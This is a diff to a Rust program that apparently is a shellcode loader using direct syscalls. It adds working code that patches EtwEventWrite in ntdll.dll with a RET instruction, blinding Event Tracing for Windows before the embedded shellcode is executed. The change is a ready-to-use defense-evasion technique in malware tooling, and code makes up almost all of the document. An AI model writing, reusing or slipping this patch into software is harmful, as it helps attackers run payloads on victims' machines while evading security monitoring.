@@ -5,7 +5,7 @@ use std::fs;
 use getrandom::fill;
 use std::env::current_exe;
 use std::str::from_utf8;
-use busywork::*;
+use std::ffi::c_void;
 use windows::Win32::Foundation::HANDLE;
 use windows::Wdk::Foundation::OBJECT_ATTRIBUTES;
 use dinvoke_rs::data::{
@@ -78,8 +78,79 @@ fn bump_counter() -> Result<(), String> {
 }
 
 
+/// Patches EtwEventWrite in ntdll.dll with a single RET instruction.
+/// All user-mode ETW providers in this process are silenced.
+fn patch_etw() -> Result<(), String> {
+    unsafe {
+        let ntdll = dinvoke_rs::dinvoke::load_library_a("ntdll.dll");
+        if ntdll == 0 {
+            return Err("ntdll.dll not found".to_string());
+        }
+
+        let etw_write = dinvoke_rs::dinvoke::get_function_address(ntdll, "EtwEventWrite");
+        if etw_write == 0 {
+            return Err("EtwEventWrite not found".to_string());
+        }
+
+        // Resolve NtProtectVirtualMemory to change page protection
+        let process_handle: HANDLE = HANDLE { 0: -1isize as _ };
+        let mut protect_base: *mut c_void = etw_write as *mut c_void;
+        let mut protect_size: usize = 1;
+        let mut old_protect: u32 = 0;
+
+        let function_type: dinvoke_rs::data::NtProtectVirtualMemory;
+        let mut ret: Option<i32>;
+
+        dinvoke_rs::dinvoke::execute_syscall!(
+            "NtProtectVirtualMemory",
+            function_type,
+            ret,
+            process_handle,
+            &mut protect_base,
+            &mut protect_size,
+            0x04, // PAGE_READWRITE
+            &mut old_protect
+        );
+
+        if ret.unwrap_or(-1) != 0 {
+            return Err("NtProtectVirtualMemory failed".to_string());
+        }
+
+        // Write RET (0xC3) at EtwEventWrite[0]
+        let ret_byte: u8 = 0xC3;
+        std::ptr::write_volatile(etw_write as *mut u8, ret_byte);
+
+        // Restore original protection
+        let mut restore_base: *mut c_void = etw_write as *mut c_void;
+        let mut restore_size: usize = 1;
+        let mut dummy: u32 = 0;
+
+        let function_type_restore: dinvoke_rs::data::NtProtectVirtualMemory;
+        let mut ret_restore: Option<i32>;
+
+        dinvoke_rs::dinvoke::execute_syscall!(
+            "NtProtectVirtualMemory",
+            function_type_restore,
+            ret_restore,
+            process_handle,
+            &mut restore_base,
+            &mut restore_size,
+            old_protect,
+            &mut dummy
+        );
+
+        if ret_restore.unwrap_or(-1) != 0 {
+            return Err("NtProtectVirtualMemory (restore) failed".to_string());
+        }
+
+        Ok(())
+    }
+}
+
 fn execute_shellcode() -> Result<(), String> {
     unsafe {
+        // Silence user-mode ETW first.
+        patch_etw()?;
         let shellcode_vec = SHELLCODE.to_vec();
         let shellcode_size = shellcode_vec.len();
 
